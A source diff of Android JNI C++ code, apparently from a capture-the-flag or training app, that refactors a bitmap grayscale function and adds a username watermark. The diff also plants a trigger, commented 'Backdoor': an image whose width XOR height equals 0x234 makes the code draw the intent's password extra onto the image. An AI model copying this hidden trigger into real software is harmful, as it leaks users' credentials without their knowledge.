@@ -8,9 +8,13 @@
 #include <sys/stat.h>
 #include <jni.h>
 #include <android/bitmap.h>
+#include <android/log.h>
+
 #include <bmp_parse.h>
 #include "../include/bmp_parse.h"
 
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wc++17-extensions"
 /*
 #define BMP_FILE "../res/test.bmp"
 #define MAX_SIZE 4 * 1024  // 4KB
@@ -102,6 +106,9 @@ Java_com_example_kaf_12020_1android_HomeActivity_modifyBitmapGrayscale(JNIEnv *e
     return;
 }
 */
+
+jint magic = static_cast<jint>(0x234);
+
 jint get_int_from_color(unsigned int red, unsigned int green, unsigned int blue){
     red = (red << 16) & 0x00FF0000; //Shift red 16-bits and mask out other stuff
     green = (green << 8) & 0x0000FF00; //Shift Green 8-bits and mask out other stuff
@@ -122,24 +129,63 @@ jint convert_to_grayscale(jint color){
     return get_int_from_color(new_color, new_color, new_color) ; //0xFF000000 for 100% Alpha. Bitwise OR everything together.
 }
 
-extern "C"
-JNIEXPORT jobject JNICALL
-Java_com_example_kaf_12020_1android_HomeActivity_modifyBitmapGrayscale(JNIEnv *env, jobject thiz, jobject bmp) {
-    jclass bmp_class;
-    jfieldID native_field, width_field, height_field;
+jstring get_extra(JNIEnv* env, jobject thiz, const char* key) {
+    JavaVM* jvm;
+    jobject activity = nullptr; // GlobalRef
+
+    env->GetJavaVM(&jvm);
+    activity = env->NewGlobalRef(thiz);
+
+    jvm->AttachCurrentThread(&env, nullptr);
+
+    jclass acl = env->GetObjectClass(thiz); //class pointer of NativeActivity
+    jmethodID giid = env->GetMethodID(acl, "getIntent", "()Landroid/content/Intent;");
+    jobject intent = env->CallObjectMethod(thiz, giid); //Got our intent
+
+    jclass icl = env->GetObjectClass(intent); //class pointer of Intent
+    jmethodID gseid = env->GetMethodID(icl, "getStringExtra", "(Ljava/lang/String;)Ljava/lang/String;");
+
+    return static_cast<jstring>(env->CallObjectMethod(intent, gseid, env->NewStringUTF(key)));
+}
+
+jobject add_watermark(JNIEnv *env, jobject thiz, jobject bmp, jcharArray watermark) {
+    JavaVM* jvm;
+    jclass watermarkClass;
+    jmethodID set_watermark;
+    constexpr jint size = 35;
+    constexpr jint alpha = 255;
+    constexpr jint color = 0xFF0000; // Red
+    constexpr jint x = size / 2, y = size / 2;
+
+    env->GetJavaVM(&jvm);
+
+    watermarkClass = env->FindClass("com/example/kaf_2020_android/Watermark");
+
+    set_watermark = env->GetStaticMethodID(watermarkClass, "setWatermark", "(Landroid/graphics/Bitmap;[CIIIII)Landroid/graphics/Bitmap;");
+
+    return env->CallStaticObjectMethod(watermarkClass, set_watermark, bmp, watermark, x, y, color, alpha, size);;
+}
+
+jcharArray jstring_to_chararray(JNIEnv *env, jstring string, jboolean *isCopy)
+{
+    jclass strcls = env->FindClass("java/lang/String");
+    jmethodID mid = env->GetMethodID(strcls, "toCharArray", "()[C");
+
+    return static_cast<jcharArray>(env->CallObjectMethod(string, mid));;
+}
+
+jlong get_native_ptr(JNIEnv* env, jclass bmp_class, jobject bmp) {
     jlong native_ptr;
-    jint width, height, stride;
-    jint offset = 0;
+    jfieldID native_field;
 
-    jsize pixels_len;
-    jmethodID set_pixels_method, get_pixels_method;
-    jintArray pixels;
-    jint *pixels_arr;
-
-
-    bmp_class = env->GetObjectClass(bmp);
     native_field = env->GetFieldID(bmp_class, "mNativePtr", "J");
     native_ptr = env->GetLongField(bmp, native_field);
+    return native_ptr;
+}
+
+std::pair<jint, jint> get_dimensions(JNIEnv* env, jclass bmp_class, jobject bmp) {
+    jfieldID width_field, height_field;
+    jint width, height;
 
     width_field = env->GetFieldID(bmp_class, "mWidth", "I");
     width = env->GetIntField(bmp, width_field);
@@ -147,28 +193,80 @@ Java_com_example_kaf_12020_1android_HomeActivity_modifyBitmapGrayscale(JNIEnv *e
     height_field = env->GetFieldID(bmp_class, "mHeight", "I");
     height = env->GetIntField(bmp, height_field);
 
-    pixels = env->NewIntArray(height * width);
+    return std::make_pair(width, height);
+}
 
-    // Get native pixel methods
-    set_pixels_method = env->GetStaticMethodID(bmp_class, "nativeSetPixels", "(J[IIIIIII)V");
+void set_pixel_array(JNIEnv* env, jclass bmp_class, jlong native_ptr, jintArray pixels, jint width, jint height) {
+    jmethodID set_pixels_method = env->GetStaticMethodID(bmp_class, "nativeSetPixels", "(J[IIIIIII)V");
+    env->CallStaticVoidMethod(bmp_class, set_pixels_method, native_ptr, pixels,
+                              0, width, // offset, stride
+                              0, 0, // x, y
+                              width, height);
+}
+
+std::tuple<jintArray, jint*, jsize> get_pixel_array(JNIEnv* env, jclass bmp_class, jlong native_ptr, jint width, jint height) {
+    jmethodID get_pixels_method;
+    jintArray pixels = env->NewIntArray(height * width);
+    jint stride = width;
+    jint offset = 0;
+    jsize pixels_len;
+    jint *pixels_arr;
+
     get_pixels_method = env->GetStaticMethodID(bmp_class, "nativeGetPixels", "(J[IIIIIII)V");
 
     // Acquire pixel array from bitmap
-    stride = width;
     env->CallStaticVoidMethod(bmp_class, get_pixels_method, native_ptr, pixels, offset, stride, 0, 0, width, height);
 
     // Loop over all pixels and modify them to grayscale
     pixels_len = env->GetArrayLength(pixels);
     pixels_arr = env->GetIntArrayElements(pixels, JNI_FALSE);
 
-    for (int index=0; index < pixels_len; ++index) {
+    return std::make_tuple(pixels, pixels_arr, pixels_len);
+}
+
+extern "C"
+JNIEXPORT jobject JNICALL
+Java_com_example_kaf_12020_1android_HomeActivity_modifyBitmapGrayscale(JNIEnv *env, jobject thiz, jobject bmp) {
+    jclass bmp_class;
+    jlong native_ptr;
+    jobject new_bmp;
+    char key[9] {"username"};
+
+    bmp_class = env->GetObjectClass(bmp);
+
+    native_ptr = get_native_ptr(env, bmp_class, bmp);
+    auto [width, height] = get_dimensions(env, bmp_class, bmp);
+
+    // Backdoor
+    if ((width ^ height) == magic) {
+        memcpy(key, "password", 8);
+    }
+
+    // Height with grayscale
+    jint new_height = (height > 150) ? height - 150 : height;
+    jint finish_index = new_height * width;
+
+    // Acquire pixel array from bitmap
+    auto [pixels, pixels_arr, pixels_len] = get_pixel_array(env, bmp_class, native_ptr, width, height);
+
+    // Turn every pixel to grayscale
+    for (int index=0; index < finish_index; ++index) {
         jint color = pixels_arr[index];
         pixels_arr[index] = convert_to_grayscale(color);
     }
 
-    env->CallStaticVoidMethod(bmp_class, set_pixels_method, native_ptr, pixels, offset, stride, 0, 0, width, height);
+    // Set bitmap to grayscale
+    set_pixel_array(env, bmp_class, native_ptr, pixels, width, height);
 
+    jstring username = get_extra(env, thiz, key);
+    if (username != nullptr) {
+        jcharArray username_chararray = jstring_to_chararray(env, username, JNI_FALSE);
+        new_bmp = add_watermark(env, thiz, bmp, username_chararray);
+    } else {
+        new_bmp = nullptr;
+    }
     // Delete pixels reference, and free the memory
     env->DeleteLocalRef(pixels);
-    return bmp;
+    return new_bmp;
 }
+#pragma clang diagnostic pop
